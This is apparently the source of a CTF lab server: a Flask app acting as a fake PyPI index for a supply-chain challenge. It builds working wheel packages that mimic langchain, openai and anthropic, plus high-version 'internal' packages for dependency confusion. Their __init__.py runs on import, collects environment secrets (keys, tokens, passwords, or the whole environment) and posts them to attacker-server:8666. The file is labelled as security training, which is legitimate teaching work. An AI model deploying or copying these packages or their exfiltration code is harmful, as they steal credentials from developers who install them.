"""
ASI04 Lab - Fake PyPI Server
Serves malicious packages for typosquatting and dependency confusion

Challenges:
- ASI04-01: Typosquatted Package
- ASI04-03: Dependency Confusion
"""

from flask import Flask, send_file, jsonify, Response
import os
import io
import zipfile
import base64
import hashlib

app = Flask(__name__)

# Malicious package payloads
PACKAGES = {
    # Typosquatted packages (similar names to legitimate ones)
    "langchaln": {  # langchain -> langchaln (typo)
        "version": "0.1.0",
        "description": "LangChain framework for LLM applications",
        "payload": "typosquat"
    },
    "langchain-agent-util": {  # langchain-agent-utils -> util (missing 's')
        "version": "1.0.0",
        "description": "Agent utilities for LangChain",
        "payload": "typosquat"
    },
    "openal": {  # openai -> openal
        "version": "1.0.0",
        "description": "OpenAI Python client",
        "payload": "typosquat"
    },
    "antropic": {  # anthropic -> antropic
        "version": "0.5.0",
        "description": "Anthropic API client",
        "payload": "typosquat"
    },
    
    # Dependency confusion - higher versions of "internal" packages
    "acme-agent-core": {
        "version": "99.0.0",  # Much higher than "internal" version
        "description": "ACME Corp Agent Core Library",
        "payload": "depconfusion"
    },
    "internal-llm-utils": {
        "version": "999.0.0",
        "description": "Internal LLM Utilities",
        "payload": "depconfusion"
    },
    "corp-ai-tools": {
        "version": "50.0.0",
        "description": "Corporate AI Tools",
        "payload": "depconfusion"
    }
}

def generate_malicious_init(package_name, payload_type):
    """Generate malicious __init__.py content"""
    
    if payload_type == "typosquat":
        return f'''"""
{package_name} - Legitimate looking package
"""
import os
import base64
import urllib.request

__version__ = "{PACKAGES[package_name]['version']}"
__author__ = "Definitely Legitimate Developer"

def _beacon():
    """Phone home on import"""
    try:
        data = {{
            "package": "{package_name}",
            "type": "typosquat_install",
            "cwd": os.getcwd(),
            "user": os.getenv("USER", "unknown"),
            "env": {{k: v for k, v in os.environ.items() 
                   if any(x in k.lower() for x in ["key", "secret", "token", "password", "api"])}},
            "flag": "ASI04_FLAG{{typ0squ4t_g0t_y0u}}"
        }}
        encoded = base64.b64encode(str(data).encode()).decode()
        urllib.request.urlopen(
            f"http://attacker-server:8666/collect?d={{encoded}}",
            timeout=3
        )
    except:
        pass

# Execute on import
_beacon()

# Legitimate-looking exports
class AgentToolkit:
    """Toolkit for agent development"""
    pass

class ToolRegistry:
    """Registry for tools"""
    pass

def format_response(text):
    return text

def parse_input(data):
    return data
'''

    elif payload_type == "depconfusion":
        return f'''"""
{package_name} - Internal package (COMPROMISED VERSION)
This version was uploaded to public PyPI with a higher version number
"""
import os
import socket
import json

__version__ = "{PACKAGES[package_name]['version']}"

def _exfil():
    """Exfiltrate on import via dependency confusion"""
    try:
        data = {{
            "package": "{package_name}",
            "type": "dependency_confusion",
            "version": __version__,
            "hostname": socket.gethostname(),
            "cwd": os.getcwd(),
            "env": dict(os.environ),
            "flag": "ASI04_FLAG{{d3p_c0nfus10n_pwn3d}}"
        }}
        
        import urllib.request
        req = urllib.request.Request(
            "http://attacker-server:8666/collect",
            data=json.dumps(data).encode(),
            headers={{"Content-Type": "application/json"}}
        )
        urllib.request.urlopen(req, timeout=3)
    except:
        pass

_exfil()

# Mimic internal package API
class AgentCore:
    def __init__(self):
        pass
    
    def process(self, data):
        return data

def initialize():
    return AgentCore()
'''

def create_package_wheel(package_name):
    """Create a wheel (.whl) for the malicious package.

    Wheels are zip archives — pip extracts them directly with no build step,
    so this bypasses the setuptools/sdist problem entirely.
    """
    pkg = PACKAGES[package_name]
    pkg_dir = package_name.replace("-", "_")
    version = pkg["version"]

    whl_buffer = io.BytesIO()
    with zipfile.ZipFile(whl_buffer, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        # Package source
        init_content = generate_malicious_init(package_name, pkg["payload"])
        zf.writestr(f"{pkg_dir}/__init__.py", init_content)

        # dist-info/METADATA (PEP 566)
        metadata = (
            f"Metadata-Version: 2.1\n"
            f"Name: {package_name}\n"
            f"Version: {version}\n"
            f"Summary: {pkg['description']}\n"
            f"Author: Legitimate Developer\n"
        )
        zf.writestr(f"{pkg_dir}-{version}.dist-info/METADATA", metadata)

        # dist-info/WHEEL (PEP 427)
        wheel_meta = (
            "Wheel-Version: 1.0\n"
            "Generator: fake-pypi-ctf\n"
            "Root-Is-Purelib: true\n"
            "Tag: py3-none-any\n"
        )
        zf.writestr(f"{pkg_dir}-{version}.dist-info/WHEEL", wheel_meta)

        # dist-info/RECORD (required by pip; empty is accepted)
        zf.writestr(f"{pkg_dir}-{version}.dist-info/RECORD", "")

    whl_buffer.seek(0)
    return whl_buffer.getvalue()


def wheel_filename(package_name):
    """Return the canonical wheel filename for a package."""
    pkg_dir = package_name.replace("-", "_")
    version = PACKAGES[package_name]["version"]
    return f"{pkg_dir}-{version}-py3-none-any.whl"

@app.route('/health', methods=['GET'])
def health():
    return jsonify({
        "status": "healthy",
        "packages": list(PACKAGES.keys()),
        "warning": "This is a MALICIOUS PyPI server for security training"
    })

@app.route('/simple/', methods=['GET'])
def simple_index():
    """PyPI simple index"""
    links = "\n".join([
        f'<a href="/simple/{pkg}/">{pkg}</a>'
        for pkg in PACKAGES.keys()
    ])
    
    return Response(f"""<!DOCTYPE html>
<html>
<head><title>Simple Index</title></head>
<body>
<h1>Simple Index</h1>
{links}
</body>
</html>""", mimetype='text/html')

@app.route('/simple/<package_name>/', methods=['GET'])
def package_index(package_name):
    """Package-specific index"""
    if package_name not in PACKAGES:
        return Response("Not Found", status=404)

    filename = wheel_filename(package_name)
    whl = create_package_wheel(package_name)
    sha256_hash = hashlib.sha256(whl).hexdigest()

    return Response(f"""<!DOCTYPE html>
<html>
<head><title>Links for {package_name}</title></head>
<body>
<h1>Links for {package_name}</h1>
<a href="/packages/{filename}#sha256={sha256_hash}">{filename}</a>
</body>
</html>""", mimetype='text/html')

@app.route('/packages/<filename>', methods=['GET'])
def download_package(filename):
    """Download package wheel"""
    for pkg_name in PACKAGES.keys():
        if filename == wheel_filename(pkg_name):
            whl = create_package_wheel(pkg_name)
            return Response(
                whl,
                mimetype='application/zip',
                headers={
                    'Content-Disposition': f'attachment; filename={filename}'
                }
            )

    return Response("Not Found", status=404)

@app.route('/pypi/<package_name>/json', methods=['GET'])
def package_json(package_name):
    """JSON API for package info"""
    if package_name not in PACKAGES:
        return jsonify({"error": "Not found"}), 404

    pkg = PACKAGES[package_name]
    filename = wheel_filename(package_name)
    whl = create_package_wheel(package_name)
    sha256_hash = hashlib.sha256(whl).hexdigest()

    return jsonify({
        "info": {
            "name": package_name,
            "version": pkg['version'],
            "summary": pkg['description'],
            "author": "Legitimate Developer"
        },
        "releases": {
            pkg['version']: [
                {
                    "filename": filename,
                    "url": f"http://localhost:8081/packages/{filename}",
                    "digests": {
                        "sha256": sha256_hash
                    }
                }
            ]
        }
    })

# CTF hint endpoints
@app.route('/hint', methods=['GET'])
def hint():
    return jsonify({
        "challenge": "ASI04 - Supply Chain",
        "hints": [
            "Look for packages with names similar to popular ones",
            "Check version numbers - unusually high versions may indicate dependency confusion",
            "The malicious code executes on import",
            "Look for network calls in __init__.py"
        ],
        "typosquat_examples": ["langchaln (langchain)", "openal (openai)"],
        "depconfusion_examples": ["acme-agent-core v99.0.0 (internal is v1.0.0)"]
    })

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║         FAKE PYPI SERVER (MALICIOUS)                         ║
    ║         Typosquatting & Dependency Confusion                 ║
    ║         Port: 8081                                           ║
    ║                                                              ║
    ║         DO NOT USE IN PRODUCTION!                            ║
    ╚══════════════════════════════════════════════════════════════╝
    
    Available malicious packages:
    """)
    for pkg, info in PACKAGES.items():
        print(f"    - {pkg} v{info['version']} ({info['payload']})")
    print()
    
    app.run(host='0.0.0.0', port=8081, debug=True)
